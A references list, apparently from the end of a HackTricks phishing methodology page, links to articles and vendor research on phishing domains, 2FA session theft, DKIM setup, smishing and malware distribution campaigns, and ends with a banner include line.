## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
